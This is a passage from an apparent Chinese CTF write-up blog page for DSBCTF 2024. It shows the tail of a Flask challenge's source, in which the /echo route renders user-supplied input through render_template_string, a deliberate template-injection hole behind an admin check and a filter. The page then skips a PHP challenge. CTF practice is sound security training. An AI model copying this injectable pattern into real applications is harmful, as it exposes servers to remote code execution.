class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;is_admin&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;is_admin&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            secret_content = file.read()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;secret.html&#x27;</span>, secret_content=secret_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;access_denied.html&#x27;</span>), <span class="number">403</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/echo&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@require_valid_url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>():</span><br><span class="line">    message = request.form.get(<span class="string">&#x27;message&#x27;</span>)</span><br><span class="line">    session[<span class="string">&#x27;echo_message&#x27;</span>] = message</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;is_admin&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;is_admin&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> key(message):</span><br><span class="line">            <span class="keyword">if</span> waf(message):</span><br><span class="line">                template = <span class="string">&#x27;your answer is &#123;&#123;%s&#125;&#125;&#x27;</span> % session[<span class="string">&#x27;echo_message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    render_template_string(template)</span><br><span class="line">                    session[<span class="string">&#x27;echo_message&#x27;</span>] = render_template_string(template)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    abort(<span class="number">404</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;echo_message&#x27;</span>] = <span class="string">&#x27;You can bypass it!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="迷雾重重"><a href="#迷雾重重" class="headerlink" title="迷雾重重"></a>迷雾重重</h2><p>php的题目不是训练的重点，不想写</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/about/">ab0ut</a></li>
+        
+          <li><a href="/categories/">categ0ries</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%C2%B7%E5%A5%BD%E7%8E%A9%E7%9A%84PHP"><span class="toc-number">1.</span> <span class="toc-text">签到·好玩的PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezzz-ssti"><span class="toc-number">2.</span> <span class="toc-text">ezzz_ssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-inject"><span class="toc-number">3.</span> <span class="toc-text">ez_inject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">3.1.</span> <span class="toc-text">非预期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%B7%E9%9B%BE%E9%87%8D%E9%87%8D"><span class="toc-number">4.</span> <span class="toc-text">迷雾重重</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&text=DSBCTF单身杯2024"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&title=DSBCTF单身杯2024"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&is_video=false&description=DSBCTF单身杯2024"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DSBCTF单身杯2024&body=Check out this article: https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&title=DSBCTF单身杯2024"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&title=DSBCTF单身杯2024"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&title=DSBCTF单身杯2024"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&title=DSBCTF单身杯2024"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&name=DSBCTF单身杯2024&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2025/11/28/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF2024/&t=DSBCTF单身杯2024"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    Rufeii
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="/">h0me</a></li><li><a href="/about/">ab0ut</a></li><li><a href="/categories/">categ0ries</a></li><li><a href="/tags/">tags</a></li><li><a href="/links/">links</a></li><li><a href="/search/">Search</a></li>
+      </ul>
+      <ul>
+            
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              
+            
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</body>
+</html>
